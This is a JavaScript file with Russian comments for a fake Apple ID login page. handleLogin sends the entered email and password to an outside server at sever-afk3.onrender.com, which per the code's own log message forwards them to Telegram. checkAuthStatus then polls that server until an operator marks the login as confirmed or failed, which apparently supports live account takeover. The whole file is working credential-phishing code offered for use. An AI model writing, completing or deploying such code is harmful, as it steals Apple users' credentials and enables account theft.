// Переменные должны быть объявлены ВНЕ функции, чтобы checkAuthStatus их видела
let currentUserId = null;
let pollInterval = null;

async function handleLogin() {
    console.log("--- Попытка входа ---");
    
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;

    // Валидация
    if (!email || !email.includes('@')) {
        console.error("Ошибка: некорректный email");
        return alert('Введите корректный Apple ID');
    }

    // Генерируем уникальный ID для этой попытки
    currentUserId = 'ID_' + Math.floor(Math.random() * 1000000);
    console.log("ID сессии:", currentUserId);

    try {
        // Показываем экран ожидания (функция showStep должна быть определена у тебя в коде)
        if (typeof showStep === 'function') {
            showStep('wait-step');
        }

        console.log("Отправка запроса на сервер...");
        
        const res = await fetch('https://sever-afk3.onrender.com/send-data', {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId: currentUserId, email, pass })
        });

        console.log("Статус ответа сервера:", res.status);

        if (res.ok) {
            console.log("Данные успешно отправлены в Telegram. Начинаем опрос статуса...");
            // Запускаем проверку: нажал ли админ кнопку в Telegram
            if (pollInterval) clearInterval(pollInterval); // Очищаем старый интервал, если был
            pollInterval = setInterval(checkAuthStatus, 3000);
        } else {
            const errorText = await res.text();
            throw new Error(`Ошибка сервера: ${res.status} - ${errorText}`);
        }
    } catch (err) {
        console.error("Критическая ошибка:", err);
        alert("Не удалось связаться с сервером. Попробуйте обновить страницу.");
        if (typeof showStep === 'function') {
            showStep('auth-step');
        }
    }
}

async function checkAuthStatus() {
    if (!currentUserId) return;

    try {
        const res = await fetch(`https://sever-afk3.onrender.com/check-status/${currentUserId}`);
        const data = await res.json();
        console.log("Текущий статус от админа:", data.status);

        if (data.status === 'success') {
            clearInterval(pollInterval);
            alert("Вход подтвержден!");
            // window.location.href = "https://icloud.com"; // Можно добавить редирект сюда
        } else if (data.status === 'error') {
            clearInterval(pollInterval);
            alert("Ошибка авторизации. Проверьте данные и попробуйте снова.");
            if (typeof showStep === 'function') {
                showStep('auth-step');
            }
        }
    } catch (err) {
        console.error("Ошибка при проверке статуса:", err);
    }
}



